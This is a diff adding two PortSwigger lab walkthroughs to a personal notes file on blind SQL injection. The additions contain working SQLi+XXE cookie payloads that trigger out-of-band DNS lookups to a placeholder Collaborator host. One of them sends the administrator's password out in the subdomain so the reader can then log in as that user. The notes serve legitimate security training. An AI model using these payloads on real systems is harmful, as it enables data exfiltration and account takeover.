@@ -16,6 +16,8 @@
 - [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
 - [Blind SQL injection with time delays](#blind-sql-injection-with-time-delays)
 - [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
+- [Blind SQL injection with out-of-band interaction](#blind-sql-injection-with-out-of-band-interaction)
+- [Blind SQL injection with out-of-band data exfiltration](#blind-sql-injection-with-out-of-band-data-exfiltration)
 
 ## SQL injection UNION attack, determining the number of columns returned by the query
 Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -291,3 +293,39 @@ docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "T
 <!-- omit in toc -->
 ### Solution
 The solution is **extremely long** and it has not been copied, see the reference link.
+
+## Blind SQL injection with out-of-band interaction
+Reference: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+
+<!-- omit in toc -->
+### Quick Solution
+This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.
+
+<!-- omit in toc -->
+### Solution
+1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ``TrackingId`` cookie.
+2. Modify the ``TrackingId`` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
+```
+The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.
+
+## Blind SQL injection with out-of-band data exfiltration
+Reference: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+
+<!-- omit in toc -->
+### Quick Solution
+This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.
+
+<!-- omit in toc -->
+### Solution
+1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the ``TrackingId`` cookie.
+2. Go to the Burp menu, and launch the Burp Collaborator client.
+3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
+4. Modify the ``TrackingId`` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
+```
+5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
+6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the ``administrator`` user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
+7. In your browser, click "My account" to open the login page. Use the password to log in as the ``administrator`` user.
